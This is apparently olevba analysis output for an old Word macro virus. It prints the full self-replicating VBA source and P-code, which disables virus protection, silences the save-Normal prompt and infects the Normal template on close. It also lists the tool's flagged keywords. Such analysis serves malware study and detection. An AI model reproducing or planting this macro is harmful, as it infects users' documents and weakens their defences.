olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Plural
Private Sub Document_Close()
On Error Resume Next: γ = Environ("WINDIR") & ".\TEMP\"
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
η = FreeFile: Open γ & "&" For Output As #η
Print #η, VBProject.VBComponents(1).CodeModule.Lines(1, 20)
Close #η: Open γ & "&&" For Output As #η
Print #η, "Private Sub Document_Open()"
Print #η, "On Error Resume Next: γ = Environ(" & Chr(34) & "WINDIR" & Chr(34) & ")" & "&" & Chr(34) & ".\TEMP\" & Chr(34)
Print #η, "Set ι = ActiveDocument.VBProject.VBComponents(1).Codemodule"
Print #η, "ι.Deletelines 1, ι.CountOfLines"
Print #η, "ι.AddFromFile (γ & " & Chr(34) & "&" & Chr(34) & ")"
Print #η, "End Sub": Close #η
Set ι = NormalTemplate.VBProject.VBComponents(1).CodeModule
ι.Deletelines 1, ι.CountOfLines: ι.AddFromFile (γ & "&&")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Fs.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2451 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002D "Copyright (C) 1998 by FlyShadow ~^^~ - Plural"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0007 ".\TEMP\"
' 	Concat 
' 	St γ 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	Ld Friend 
' 	St η 
' 	BoS 0x0000 
' 	Ld γ 
' 	LitStr 0x0001 "&"
' 	Concat 
' 	Ld η 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #5:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #6:
' 	Ld η 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld γ 
' 	LitStr 0x0002 "&&"
' 	Concat 
' 	Ld η 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #7:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	PrintItemNL 
' Line #8:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "On Error Resume Next: γ = Environ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "WINDIR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitStr 0x0001 "&"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 ".\TEMP\"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #9:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "Set ι = ActiveDocument.VBProject.VBComponents(1).Codemodule"
' 	PrintItemNL 
' Line #10:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "ι.Deletelines 1, ι.CountOfLines"
' 	PrintItemNL 
' Line #11:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "ι.AddFromFile (γ & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "&"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #12:
' 	Ld η 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	Ld η 
' 	Sharp 
' 	Close 0x0001 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ι 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ι 
' 	MemLd CountOfLines 
' 	Ld ι 
' 	ArgsMemCall Deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld γ 
' 	LitStr 0x0002 "&&"
' 	Concat 
' 	Paren 
' 	Ld ι 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #15:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

